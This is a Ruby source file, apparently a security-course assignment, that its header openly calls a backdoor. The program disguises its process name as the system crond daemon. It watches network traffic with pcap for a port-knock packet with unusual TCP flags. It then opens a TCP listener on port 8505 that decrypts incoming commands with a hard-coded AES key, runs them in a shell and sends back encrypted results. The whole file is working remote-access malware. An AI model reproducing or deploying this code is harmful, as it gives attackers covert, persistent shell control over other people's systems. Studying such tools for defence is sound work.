#! /usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
--  SOURCE FILE:    server.rb - This is a backdoor. Do not run this unless you intent on
--                              finding and ending the program later. Program uses pcaplib
--                              and awaits signature knock. Once knock is received, opens
--                              a TCP server that gives shell access.
--
--  PROGRAM:        server
--                ./server.rb 
--
--  FUNCTIONS:      
--
--  Ruby Gems required:     ruby-pcap for pcaplet
--                          https://rubygems.org/gems/ruby-pcap
--
--  DATE:           May 2014
--
--  REVISIONS:      See development repo: https://github.com/deuterium/comp8505-assign2
--
--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
--
--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
--
--  NOTES:          problem with client/server socket buffer. sometimes messages get overread.
--  
---------------------------------------------------------------------------------------
=end

require 'socket'
require 'openssl' #http://www.ruby-doc.org/stdlib-2.1.1/libdoc/openssl/rdoc/OpenSSL/Cipher.html
require 'pcaplet' #http://www.goto.info.waseda.ac.jp/~fukusima/ruby/pcap/doc/index.html


# rename process immediately 
$0 = "/usr/sbin/crond -n"

## Variables

@device = "wlp2s0" # interface to filter on
$key = OpenSSL::Digest::SHA256.new("verysecretkey").digest

## Functions
# Starts capturing on device and monitors for "signature knock" packet.
# Currently the knock packet is a TCP packet from source port 27564, with
# TCP flags PSH, RST, FIN set.
#
# @return [Boolean]
# - returns true when correct packet is received
def wait_for_knock
    # listen for signature
    capture = Pcaplet.new("-s 65535 -i #{@device}")
    filter = Pcap::Filter.new("tcp and src port 27564", capture.capture)

    capture.each do |pkt|
        if filter =~ pkt && pkt.tcp_psh? && pkt.tcp_rst? && pkt.tcp_fin? \
            && !pkt.tcp_urg?  && !pkt.tcp_ack?  && !pkt.tcp_syn?
            return true
        end
    end
end

# Decrypts a received message
#
# @param [String] data 
# - data to decrypt
# @return [String]
# - decrypted message
def decrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.decrypt

    cipher.key = $key

    begin
        msg = cipher.update(data)
        msg << cipher.final
    rescue Exception => e
        #puts e
    end
    return msg
end

# Encrypts a message for transmission
#
# @param [String] data 
# - msg to encrypt
# @return [String]
# - encrypted payload
def encrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.encrypt

    cipher.key = $key

    begin
        payload = cipher.update(data)
        payload << cipher.final
    rescue Exception => e
        #puts e
    end
    return payload
end

# Starts TCP Server on port 8505
# This server provides one connecting socket that grants shell access.
#
def start_server
    tcpserver = TCPServer.open(8505)
    Thread.start(tcpserver.accept) do |client|
        loop {
            client.flush
            cmd = decrypt(client.gets.chomp)
            if cmd.downcase == "quit"
                client.close
                Thread.exit 
                #go back to knock loop
            else
                #puts "hello: command is #{cmd}"
                results = %x{ #{cmd} }
                client.puts encrypt(results)
                client.flush
            end
        }
    end
    tcpserver.shutdown #close down if disconnected
end
## Main

loop {
    if wait_for_knock #return back to looking for knocks if server ends
        start_server
    end
}
